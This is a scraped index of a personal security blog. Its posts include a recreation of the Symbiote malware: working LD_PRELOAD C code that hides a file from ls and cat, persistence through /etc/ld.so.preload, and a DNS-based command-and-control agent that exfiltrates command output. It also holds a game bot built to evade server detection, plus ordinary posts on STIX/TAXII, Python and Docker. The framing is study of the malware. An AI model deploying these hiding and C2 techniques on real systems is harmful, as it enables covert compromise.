reading further, I want you to know that this post is about research I did on static analysis.","title":"Static Analysis Research - Windows PE"},{"content":"Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) (this one) Overview Following my last post about some evasion techniques that the Symbiote uses which I tried to recreate in their simplest form, this post will see how the Symbiote is communicating to the command and control C2 server.\nUpon reading the article, we can see that the Symbiote uses the DNS Protocol to exfiltrate data out of the infected machine, the way that it does that is by chunking it into a bunch of A Resource Records (RR) that it sends through the UDP. The A Record looks like this:\n{PACKET_NUMBER}.{MACHINE_ID}.{HEX_ENCODED_PAYLOAD}.{DOMAIN_NAME} I will deliberately skip the whole authentication process that the malware uses, since it gets out of the scope of the post.\nWhy DNS and not {arbitrary protocol}? DNS is being used in order to avoid/bypass the firewall rules and in some special scenarios that no TCP outgoing communication is possible.\nBypassing security products via DNS data exfiltration\nImplementation I will explain it briefly from the agent\u0026rsquo;s point of view. We are sending the C2 server a beam (in a shape of a DNS request) every n seconds to check if there is a command for us to execute if we receive a non empty Answer with a TXT Record (containing a command such as ls) we execute that command and after we have the output of the command, we exfiltrate it back to the C2 Server. This happens by sending multiple DNS A record questions (chunks) back to the server. I used the same format that the Symbiote uses for the records.\nNote: Each element of a domain name can contain up to 63 chars of information, a full domain name can contain 253 chars. More info\nAfter the server receives a request with the packet number and the total number of packets (that\u0026rsquo;s the first part of the message) it starts building the output message that we will see after we receive all the packets (through the {HEX_ENCODED_PAYLOAD} part of the message).\nCode / Demo Repository - The repository is created for a starting point to improve/build upon.\nThe repository contains both the agent and the server. When the server is being ran it sets the default handler dns.HandleFunc(\u0026quot;.\u0026quot;, AgentHandler) to handle any pattern for domain question this is for convenience, in some other cases you will want to specify some special handles.\nUsage Start the server $ go run main.go 127.0.0.1:8053 Start the agent $ go run ./agent/main.go Execute commands on the server side shell (In the case below simple dir). Note that I type cmd /C dir - Why? \u0026gt;\u0026lt;((((\u0026gt; dns c2 by syl \u0026lt;))))\u0026gt;\u0026lt; dnsc2\u0026gt; cmd /C dir Volume in drive C is OS Volume Serial Number is XXXX-XXXX Directory of C:\\code\\dnsc2\\agent 10/28/2022 08:40 PM \u0026lt;DIR\u0026gt; . 10/29/2022 11:03 PM \u0026lt;DIR\u0026gt; .. 10/28/2022 08:40 PM 481 go.mod 10/28/2022 08:40 PM 3,755 go.sum 10/30/2022 12:37 PM 1,762 main.go 3 File(s) 5,998 bytes 2 Dir(s) 107,561,959,424 bytes free Conclusion Please note that there could be some easier ways to do this, and some information can be wrong I did my best to research everything that I post here, if you find an error or if you think that something can be improved somewhere you can drop me a message!\nResources https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat https://stackoverflow.com/a/28918017 https://www.cloudflare.com/learning/dns/what-is-dns/ https://resources.infosecinstitute.com/topic/bypassing-security-products-via-dns-data-exfiltration/ ","permalink":"https://sy1.sh/posts/dns-c2-communcation/","summary":"Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) (this one) Overview Following my last post about some evasion techniques that the Symbiote uses which I tried to recreate in their simplest form, this post will see how the Symbiote is communicating to the command and control C2 server.\nUpon reading the article, we can see that the Symbiote uses the DNS Protocol to exfiltrate data out of the infected machine, the way that it does that is by chunking it into a bunch of A Resource Records (RR) that it sends through the UDP.","title":"Using DNS as C2 Communication - Evasive Techniques (Part 3)"},{"content":" Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) (this one) Using DNS as C2 Communication - Evasive Techniques (Part 3) Journey Post This post is a something that I call \u0026ldquo;journey post\u0026rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like \u0026lt;journey\u0026gt; so that you can skip it if you are in a hurry.\nOverview In the last post I\u0026rsquo;ve described how I hid a file from all the sys calls that are using readdir. In this post I will try to hide it from the cat command. Let\u0026rsquo;s first examine/reverse engineer how the cat command works internally.\nNaturally I would start with a simple strace which will trace the system calls and signals that the command uses.\n$ which cat /usr/bin/cat $ strace /usr/bin/cat syl.lys execve(\u0026#34;/usr/bin/cat\u0026#34;, [\u0026#34;/usr/bin/cat\u0026#34;, \u0026#34;syl.lys\u0026#34;], 0x7ffca9c17508 /* 68 vars */) = 0 ... access(\u0026#34;/etc/ld.so.preload\u0026#34;, R_OK) = -1 ENOENT (No such file or directory) // WINK WINK, not yet ... openat(AT_FDCWD, \u0026#34;syl.lys\u0026#34;, O_RDONLY) = 3 The most interesting sys call in the output is openat so lets see the source code of openat.c. Here we can see the char const *file that variable is what holds our filename (look at the strace output). After that, I followed our steps in the last post by implementing a function with the same signature and wrapping the original one.\n\u0026lt;journey\u0026gt;\nAfter a few tries I was quick to realize that there is some issue. The wrapper that I\u0026rsquo;ve implemented didn\u0026rsquo;t work, or at least didn\u0026rsquo;t work all the time. I\u0026rsquo;ve tested it out with a simple program that would just call it and in there it worked, I didn\u0026rsquo;t quite get why it does what it does but I found the following discussions:\nintercepting the openat() system call for GNU tar How to find out what functions to intercept with LD_PRELOAD? As it turns out (my best guess) the sys call that I am trying to override openat is probably not the one that the cat uses. I decided to look at the source code for [cat.c][https://github.com/coreutils/coreutils/blob/master/src/cat.c] and search for everything that has *open* in it.\nI found on line 686 a call to the open. An important note here is that this open call here is not the sys call but the call in the std lib which will call the related system call for us. So I\u0026rsquo;ve decided to change my approach and override the open function instead.\n\u0026lt;/journey\u0026gt;\nHow does the open function work? I wouldn\u0026rsquo;t try to explain something that I am hardly good at so it is best for you to read the man pages for that one.\nLet\u0026rsquo;s start by copying the signature of the open function and wrap it.\nstatic int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } In this code block I\u0026rsquo;ve wrapped the original open function with our implementation of the open function. What is left now is to add our \u0026ldquo;malicious\u0026rdquo; part to it.\nif (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; // Setting up the error to be ERROR NO ENTRY(ENOENT) return -1; // Returning -1 (failure) } And lastly all together\nintercept_open.c\n#define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34; static int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } Let\u0026rsquo;s see if its working\u0026hellip;\n$ ls intercept_open.so syl.lys $ LD_PRELOAD=./intercept_open.so cat syl.lys cat: syl.lys: No such file or directory As you can see the cat command returns No such file or directory which is exactly what we are aiming for.\nCombining it with our readdir We created a malicious open function that wraps the original one from the standard lib, lets now combine it with the readdir from the previous post into a single shared object.\nmalicious.c\n#define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34; static int (*original_open)(const char *filename, int flags, ...) = NULL; struct dirent *(*original_readdir)(DIR *dirp) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } struct dirent *readdir(DIR *dirp) { struct dirent *ret; original_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); while((ret = original_readdir(dirp))) { if(strstr(ret-\u0026gt;d_name, MALICIOUS_FILE) == 0) break; } return ret; } Let\u0026rsquo;s test it out, supposedly we shouldn\u0026rsquo;t get entries from ls and cat.\n$ touch syl.lys $ ls intercept_open.c malicious.c malicious.so syl.lys $ export LD_PRELOAD=./malicious.so $ ls intercept_open.c malicious.c malicious.so README.md $ cat syl.lys cat: syl.lys: No such file or directory End With that I am concluding this post, again if you reached here thank you so much it means a lot! In the next part I will get deeper and make our malicious file to be running and beaconing a malicious C2 server, we will look through some C2 communication examples using the DNS protocol so that we can remain under the radar(or the firewall ^^).\nFull Source Code\nResources This post wouldn\u0026rsquo;t be possible without:\nhttps://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html https://linux.die.net/man/2/openat And some kind StackOverflow users! ","permalink":"https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/","summary":"Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) (this one) Using DNS as C2 Communication - Evasive Techniques (Part 3) Journey Post This post is a something that I call \u0026ldquo;journey post\u0026rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like \u0026lt;journey\u0026gt; so that you can skip it if you are in a hurry.","title":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)"},{"content":" Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the \u0026ldquo;Nearly-Impossible-to-Detect Linux Threat\u0026rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I\u0026rsquo;ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:\nHijack Execution Flow: Dynamic Linker Hijacking What Is the LD_PRELOAD? What is a Shared Library? Implementation I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I\u0026rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.\nWhat do we need first and how to hide a file from lets say a command like ls? With a little bit of investigating of how the ls works internally through the source code and the linux manual page We can see that internally we have a function that is called print_dir. I\u0026rsquo;ve truncated the comments of the original source code.\n... static void print_dir (char const *name, char const *realname, bool command_line_arg) ... If we continue further down the function we can see the loop that actually iterates over the files\n... while (true) { errno = 0; next = readdir (dirp); // Here we can see that the loop iterates over readdir as long // as the pointer that readdir returns isn\u0026#39;t null and the errno != 0 if (next) { if (! file_ignored (next-\u0026gt;d_name)) // we can see here that it the filename is // taken from the next variable, lets look through the source code of `readdir` { ... Let\u0026rsquo;s confirm that by invoking nm this will show us the dynamic symbols that are being loaded from shared libs.\n$ nm -D /usr/bin/ls | grep \u0026#34;readdir\u0026#34; U readdir@GLIBC_2.2.5 Now I concluded that I need to search into the source code of readdir which is located here and the linux manual page. The description more or less describes exactly what we concluded from the source code of ls.c. Lets see where we set that d_name variable.\n#include \u0026lt;dirent.h\u0026gt; struct dirent *readdir(DIR *dirp); // Signature of the readdir struct dirent { ino_t d_ino; /* Inode number */ off_t d_off; /* Not an offset; see below */ unsigned short d_reclen; /* Length of this record */ unsigned char d_type; /* Type of file; not supported by all filesystem types */ char d_name[256]; /* Null-terminated filename */ }; ⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the dirent structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that d_name will exists since this field must be implemented on all POSIX systems.\nAlright, let\u0026rsquo;s start implementing our own function readdir that we will wrap the original one with.\nintercept_readdir.c\n#define _GNU_SOURCE #include \u0026lt;dirent.h\u0026gt; // Including the Directory Entry structure // The dynamic linking header file so we can use the dlsym // which will give us the address for the readdir symbol #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; // So we can use the strstr struct dirent *readdir(DIR *dirp) { struct *(handle)(DIR *); // https://man7.org/linux/man-pages/man3/dlsym.3.html // Search for RTLD_NEXT, basically it allow us to wrap // the original function handle = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;) struct dirent *dp; // Iterating over the return values of our original `readdir` while((dp = handle(dirp))) { // if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-\u0026gt;d_name`) // break the loop and go to the next entry, essentially skipping our file. if(strstr(dp-\u0026gt;d_name, \u0026#34;syl.lys\u0026#34;) == 0) break; } return dp; } This is what our final version of wrapper for readdir would look like. Now let\u0026rsquo;s try to compile it.\n$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl Flags:\nfPIC -shared creates a shared object -D_GNU_SOURCE flag / _GNU_SOURCE - TLDR: We need it for RTLD_NEXT -ldl Now that we have shared object (*.so) file lets see how to use it in action.\nHow to overwrite the exported symbols? LD_PRELOAD What is LD_PRELOAD? I advise you to read that first to get a better understanding of how it works.\nThe next thing that we are going to do is to test our shared library and see if it works. Lets run ls with our libhidemyfile.so loaded before anything else.\n$ ls libhidemyfile.so syl.lys $ LD_PRELOAD=./libhidemyfile.so ls libhidemyfile.so As you can see we successfully implement a shared library that hides our file from ls, and not only that command, every command that uses readdir won\u0026rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing LD_PRELOAD in front of every command.\n/etc/ld.so.preload If you read carefully the man pages for LD_PRELOAD you should know that you won\u0026rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.\nInstead we are going to use the /etc/ld.so.preload which does not suffer from these restrictions. This suffers from requiring root privileges but c\u0026rsquo;mon.. if you are here you will get those!\nWe first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.\n$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so Then we just need to place our library dir in ld.so.preload file.\n$ sudo echo \u0026#34;/lib/libhidemyfile.so\u0026#34; \u0026gt; /etc/ld.so.preload And if everything is good, executing ls or any of its aliases will hide our file from the output. Let\u0026rsquo;s verify this by using ldd\n$ ldd /bin/ls linux-vdso.so.1 (0x00007ffc0c8e2000) /lib/libhidemyfile.so (0x00007f00e59e4000) \u0026lt;--- Here it is! libselinux.so.1 =\u0026gt; /lib64/libselinux.so.1 (0x00007f00e5997000) libcap.so.2 =\u0026gt; /lib64/libcap.so.2 (0x00007f00e598d000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007f00e5600000) libpcre2-8.so.0 =\u0026gt; /lib64/libpcre2-8.so.0 (0x00007f00e58f0000) /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000) For your convenience I\u0026rsquo;ve setup a Docker container that you can use with ld.so.preload setup\n$ docker run -it --rm sylly/ctf_findme End If you reached here, thank you so much for the read. In the next part I will try to \u0026ldquo;completely\u0026rdquo; hide it from the system because now if we cat it despite not \u0026ldquo;reading\u0026rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.\nFull Source Code\nResources This post wouldn\u0026rsquo;t be possible without:\nhttps://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/ https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf https://attack.mitre.org/techniques/T1574/006/ https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/ https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/ https://blog.jessfraz.com/post/ld_preload/ ","permalink":"https://sy1.sh/posts/dynamic-linker-hijacking-experiments/","summary":"Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the \u0026ldquo;Nearly-Impossible-to-Detect Linux Threat\u0026rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I\u0026rsquo;ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:","title":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)"},{"content":" Recently I\u0026rsquo;ve been fascinated with a game called LegionTD2, this is a newly created game that I\u0026rsquo;ve been playing as a map ever since Warcraft 3, it is tactical multiplayer tower-defense(td). The game is based on predictions and timings, if you play your cards right (or in the context of the game: sends/workers/units) you will prevail over the enemy team. Read more about it here.\nLegionTD SDK I\u0026rsquo;ve doing stuff in Go in my free time (mainly code challenges) for a while now and I\u0026rsquo;ve decided that I should spend some time creating something useful for myself such as creating tools that would help me get better at the game. The game has an API which resides here, there are couple of endpoints that are useful for helpful statistics such as the player/* and games/* endpoints. I knew that I will be querying the API a lot for fetching info about players and games, so I\u0026rsquo;ve decided to create an SDK for that so I can ease my work a little bit. And after couple of weeks free time work I\u0026rsquo;ve created the LegionTD 2 SDK for Go.\nFunctionality Analyze games While my ultimate goal is to create set of analytics tools for Legion, I\u0026rsquo;ve created the most basic example of how that might happen using SQLite3 and Go.\nUnder the examples/analyze_games/ I\u0026rsquo;ve created an example that fetches about 3k games and put them into a SQLite database, after that you are able to analyze the data using SQL. I\u0026rsquo;ve created a simple query that gets the percentage of games that are being finished at waves 15, 13 and 10.\nIn my case here are the results, games finished at wave\nWave 15 Wave 13 Wave 10 20% 14% 4% Exporting the games You can derive that from the previous example but I\u0026rsquo;ve created a dedicated examples for both exporting to JSON and exporting to SQL.\nExport games to SQL Export games to JSON Fetching all of the Units Since that the game hasn\u0026rsquo;t got a dedicated route for fetching all the units I\u0026rsquo;ve created a simple example that resides in the repository under examples/get_all_units. The important thing here is that I\u0026rsquo;ve exported all the units into a single txt file and then I just spawn requests for each unit.\nConclusion I will be updating the SDK as I am progressing with the analytical tools and I will be adding new examples and adding new posts as I am doing it. For now you can keep an eye on the repository and I will be definitely posting/discussing more about it in the Discord Channel.\n","permalink":"https://sy1.sh/posts/legiontd2-sdk/","summary":"Recently I\u0026rsquo;ve been fascinated with a game called LegionTD2, this is a newly created game that I\u0026rsquo;ve been playing as a map ever since Warcraft 3, it is tactical multiplayer tower-defense(td). The game is based on predictions and timings, if you play your cards right (or in the context of the game: sends/workers/units) you will prevail over the enemy team. Read more about it here.\nLegionTD SDK I\u0026rsquo;ve doing stuff in Go in my free time (mainly code challenges) for a while now and I\u0026rsquo;ve decided that I should spend some time creating something useful for myself such as creating tools that would help me get better at the game.","title":"LegionTD2 Go SDK (v0.2.0)"},{"content":"There are some use-cases where a plugin architecture is needed, I call this \u0026ldquo;code\u0026rdquo; plugins but it is quite possible that there is already a word for that. The idea is to \u0026rsquo;load\u0026rsquo; functions or classes that are dynamically created so that you can have the reference to the instances at runtime. I\u0026rsquo;ve created 2 solutions for that matter one that is using the __subclasses__ dunder method and one using a decorator.\nSolution 1 Repository: https://github.com/syrull/plugin-arch-python/tree/main/Solution-1\nSOLUTION-1 │ configuration.py │ main.py │ README.md │ setup.py │ └───actions action_example1.py action_example2.py __init__.py Loading the __subclasses__ of the BaseAction class and creating a \u0026lsquo;pluggable\u0026rsquo; classes. The actions can be specified in the configuration.py file in the ACTIONS const. This method is inspired by django\u0026rsquo;s INSTALLED_APPS method.\nThe call method is a placeholder for the \u0026ldquo;actions\u0026rdquo;.\nTo Register an action New python file in actions/ folder Create a class with an appropriate name (ex. ClickAction) Extend the class with BaseAction Add an entry to ACTIONS const located in configuration.py file with the approriate path to the module After that the function will be available at the register in the main.py file.\n$ python main.py [\u0026lt;class \u0026#39;actions.action_example1.Example1Action\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;actions.action_example2.Example2Action\u0026#39;\u0026gt;] Benchmarks Measure-Command { python .\\main.py } Days : 0 Hours : 0 Minutes : 0 Seconds : 0 Milliseconds : 24 Ticks : 240745 TotalDays : 2.78640046296296E-07 TotalHours : 6.68736111111111E-06 TotalMinutes : 0.000401241666666667 TotalSeconds : 0.0240745 TotalMilliseconds : 24.0745 Solution 2 Repository: https://github.com/syrull/plugin-arch-python/tree/main/Solution-2\nSOLUTION-2 │ main.py │ README.md │ register.py │ └───actions action_example1.py action_example2.py __init__.py The benefits of this solution are that we have a control over the decorator and we can pass some custom *args, **kwargs to the decorated functions.\nTo Register an action New python file in actions/ folder Create function with an appropriate name (ex. action_onclick) Decorate the function with register_action decorator Export the function in the __all__ method in actions/__init__.py file After that the function will be available at the register in the main.py file.\n$ python main.py [\u0026lt;function action_example1 at 0x000001CC3F88D310\u0026gt;, \u0026lt;function action_example2 at 0x000001CC3F88D3A0\u0026gt;] Benchmarks Measure-Command { python .\\main.py } Days : 0 Hours : 0 Minutes : 0 Seconds : 0 Milliseconds : 22 Ticks : 227803 TotalDays : 2.6366087962963E-07 TotalHours : 6.32786111111111E-06 TotalMinutes : 0.000379671666666667 TotalSeconds : 0.0227803 TotalMilliseconds : 22.7803 ","permalink":"https://sy1.sh/posts/create-plugin-architecture-with-python/","summary":"There are some use-cases where a plugin architecture is needed, I call this \u0026ldquo;code\u0026rdquo; plugins but it is quite possible that there is already a word for that. The idea is to \u0026rsquo;load\u0026rsquo; functions or classes that are dynamically created so that you can have the reference to the instances at runtime. I\u0026rsquo;ve created 2 solutions for that matter one that is using the __subclasses__ dunder method and one using a decorator.","title":"Create Plugin Architecture With Python"},{"content":"This fishing bot consists only of about 50 lines of code, it incorporates the mechanics of World of Warcraft and some simple Windows API Calls.\nRepository: https://github.com/syrull/simple-fishing-bot\nOverview The bot has about ~99% success rate, there are some extremely rare cases where the bot won\u0026rsquo;t catch it and I will explain why later. The method that the bot is using, should work in almost any fishing scenario in the game, I would personally avoid crowded places. The testing has been done in the current expansion (Shadowlands).\nThe bot is running on the currently Active Window, I haven\u0026rsquo;t performed checks wether this is the window of the game or not. It waits for about 2 seconds before it starts.\nMetrics Zereth Mortis: 29m 33s Items Looted: 161 That means that we loot roughly about ~5.4 fish per minute.\nInstallation \u0026amp; Usage Check the requirements.txt, for the Python Requirements and install them via pip install -r requirements.txt. The tests are done under Python3.10 however I believe everything should work with Python\u0026gt;=3.6.\nSet the bait Before using the bot, you need to supply it with an image of the bait. The image has to be on the bottom parts of the bait. Here is an example image, the green area indicates what would be a good image of the bait, it needs to be as small as possible.\nSave the image and place it at the root of the script as bait.png, additionally you can adjust the variable BAIT_IMAGE in the `fishingbot.py.\n⚠️ It is important for you to take the photo because of the graphical/display settings which can be different for each computer.\nFine-tune the script The fine tunning that you have to do consists of:\nFISHING_BUTTON = \u0026#34;b\u0026#34; TUNE_BAIT_MOUSE_UNDER_PX = 35 EDGE_RESET = 10, 10 ACTIVE_AFTER = 2 CONFIDENCE = 0.7 Variable Description FISHING_BUTTON The button that you use for fishing, in my case it was b TUNE_BAIT_MOUSE_UNDER_PX The offset pixels where the mouse is going to be whenever there is a bait, see the How it works? section EDGE_RESET Those are the x, y coordinates to reset the mouse after catching the fish, it is used to improve the success rate, leave it at 10, 10 ACTIVE_AFTER The bot simply waits 2 secs before it starts CONFIDENCE The confidence of the template matching How it works? The method is extremely simple, it utilizes two things. The first one is the Template Matching, this is what pyautogui.locateOnScreen uses under the hood and the second one is the PyGetCursorInfo function which is exposed by the win32gui lib.\nThe solution lies in the gif from the beginning, whenever the bobber actually catches a fish the AoE (Area of Effect) for the bobber becomes bigger allowing us to detect a change on the cursor, then we use the GetCursorInfo to catch the change of the cursor and if it becomes a different tuple from the default one which we set when there is nothing active on our cursor. Then we execute the click.\nNow about the fine-tuning, look at this example\nThe TUNE_BAIT_MOUSE_UNDER_PX variable which doesn\u0026rsquo;t have the best name ever is indicated with red, in simple terms it is how many pixels under the located bobber to place the mouse. For myself the range between 28-32 works the best, but as I said earlier this could differ.\nEdge cases There is a rare edge case when the default tuple for the cursor doesn\u0026rsquo;t change which happens if the script isn\u0026rsquo;t tune right, I\u0026rsquo;ve solved this by resetting the cursor at x=10, y=10 position of the screen and then bringing it back. In a case when the cursor\u0026rsquo;s icon doesn\u0026rsquo;t change and if it sits with the bait icon the bot would just wait the duration of the fishing and reset itself.\nAdditional features I\u0026rsquo;ve added a bit of randomness in the timings between each press of the fishing and the click of the bobber with additionally pressing space every now and then. Apparently the server can detect that something fishy is going on when this randomness is removed.\n","permalink":"https://sy1.sh/posts/simple-fishing-bot/","summary":"This fishing bot consists only of about 50 lines of code, it incorporates the mechanics of World of Warcraft and some simple Windows API Calls.\nRepository: https://github.com/syrull/simple-fishing-bot\nOverview The bot has about ~99% success rate, there are some extremely rare cases where the bot won\u0026rsquo;t catch it and I will explain why later. The method that the bot is using, should work in almost any fishing scenario in the game, I would personally avoid crowded places.","title":"Simple Fishing Bot for World of Warcraft"},{"content":"Introduction STIX What is STIX and what is TAXII? In the most simple terms STIX is a model of Threat Intelligence that is represented in motivations, abilities, capabilities and response objects. Those objects are then represented in either JSON (STIX 2) or XML (STIX 1).\nHere is a very simple representation of STIX Objects in a graph. Explanation of the example\nThe data can be helpful for preventing or mitigating various kinds of attacks that can be expressed with STIX. All the list of the examples you can find in their official example page.\nTAXII The STIX data has to be relayed in some way, that\u0026rsquo;s why we have the TAXII Server. It is a simple web server specifically created for storing and sharing that kind of data.\nTAXII 1.x Structure The TAXII 1.2 Server has the following structure:\nDiscovery Service - Within a POST request to their discovery URL (which should be pointed by the Server maintainers). Collection Management URL - The service that has the collections with STIX objects. Channels - Push/Subscribe pattern. The full list of features for TAXII1 can be found in their official documentation:\nhttps://docs.oasis-open.org/cti/taxii/v1.1.1/taxii-v1.1.1-part3-http.html https://taxiiproject.github.io/releases/1.1/TAXII_Overview.pdf https://www.oasis-open.org/committees/download.php/57324/OASIS TAXII 2.x Structure For the newer versions of the TAXII Server we have the following structure:\n/discovery - Discovers the paths to the different services provided by the Server. api_roots - Provides the API URLs for the different types of Collection Management. collections - Provides the available collections for the given api_root. collection/objects - Provides a list of STIX Objects in a given collection You can see that this is very similar to the TAXII 1.x servers, there isn\u0026rsquo;t much of a difference in the structure besides that the collection_management_url is api_root in TAXII 2.x.\nThe full list of features for TAXII2 can be found in their official documentation.\nTAXII Servers and Threat Intelligence Providers The information about this is very scarce so I\u0026rsquo;ve gathered a quick list of the known providers for STIX data.\nResource URL Description Data Type AlienVault OTX https://otx.alienvault.com/api Requires an account, provides data in various ways including a TAXII Server. STIX 1.x Threat Connect https://threatconnect.com/stix-taxii/ Requires an account, Paid service, (consumes and provides) threat intel. STIX 1.x/2.x EcleticIQ https://www.taxiistand.com/ Test TAXII (v1x) server. (quite unstable and inconsistent) STIX 1.x Limo - Anomali https://www.anomali.com/resources/limo Test TAXII (v1x/v2x) server. Somewhat unstable but mostly fine during tests. STIX 1.x/2.x Tools for STIX/TAXII The main tool for creating/parsing or generating STIX data is going to be Python, since that all of the tools created are written in Python. Of course there are other alternatives but currently that\u0026rsquo;s the most common one.\nOther tools that might come in handy.\nTool Description Version stix-shifter Translates STIX to various other Threat Intelligence formats such as Carbon Black Cloud Query and others STIX 1.x/2.x stix2 The main python package to parse and use/create STIX2 data. STIX 2.x stix2-validator Provides a validation for the STIX2 data, can be used to validate your data from your sources. STIX 2.x stix2-slider Transforms STIX2 content to STIX1.2 STIX 2.x stix2-elevator Transforms STIX1 data to STIX2.x STIX 1.x stix The main python package for STIX1 data. STIX 1.x stix-validator Validating STIX1 data. STIX 1.x stix2-patterns Validator and Pattern Parser for STIX 2.x Patterns STIX 2.x taxii2-client Python Client for TAXII 2 Servers TAXII 2.x cabby Python Client for TAXII 1 Servers TAXII 1.x Snippets and Gists https://gist.github.com/syrull/6a2614560fb0474df166a51bcb34990d (Creating a TAXII2 Client for LimoAnomali) https://gist.github.com/syrull/73b1798f90c4109a13ef9fceb1f2f858 (Creating a TAXII1 Client for OTXAlienVault) ","permalink":"https://sy1.sh/posts/stix-taxii-complete-knowledge/","summary":"Introduction STIX What is STIX and what is TAXII? In the most simple terms STIX is a model of Threat Intelligence that is represented in motivations, abilities, capabilities and response objects. Those objects are then represented in either JSON (STIX 2) or XML (STIX 1).\nHere is a very simple representation of STIX Objects in a graph. Explanation of the example\nThe data can be helpful for preventing or mitigating various kinds of attacks that can be expressed with STIX.","title":"STIX/TAXII - Complete Knowledge"},{"content":"Quick notes about how to forward an ssh agent and other tricks regarding the installation of python packages.\nUsing SSH Forwarding Exporting the $SSH_AUTH_SOCK environment variable in the image.\n$ docker run -rm -t -i -v $(dirname $SSH_AUTH_SOCK) -e SSH_AUTH_SOCK=$SSH_AUTH_SOCK ubuntu /bin/bash Or in the environment section of a compose file.\nenvironment: SSH_AUTH_SOCK: $SSH_AUTH_SOCK Eventual Issues with that Installing ssh in the container Adding entries to /etc/ssh/ssh_known_hosts Caveats Traces of ssh keys inside the image References https://gist.github.com/d11wtq/8699521 https://vsupalov.com/build-docker-image-clone-private-repo-ssh-key/ https://medium.com/@bmihelac/examples-for-building-docker-images-with-private-python-packages-6314440e257c ","permalink":"https://sy1.sh/posts/installing-private-packages-in-docker-image-notes/","summary":"Quick notes about how to forward an ssh agent and other tricks regarding the installation of python packages.\nUsing SSH Forwarding Exporting the $SSH_AUTH_SOCK environment variable in the image.\n$ docker run -rm -t -i -v $(dirname $SSH_AUTH_SOCK) -e SSH_AUTH_SOCK=$SSH_AUTH_SOCK ubuntu /bin/bash Or in the environment section of a compose file.\nenvironment: SSH_AUTH_SOCK: $SSH_AUTH_SOCK Eventual Issues with that Installing ssh in the container Adding entries to /etc/ssh/ssh_known_hosts Caveats Traces of ssh keys inside the image References https://gist.","title":"Installing Private Packages in Docker Image - Notes"},{"content":"syl[at]sy1.sh\n","permalink":"https://sy1.sh/cv/","summary":"syl[at]sy1.sh","title":"About"}]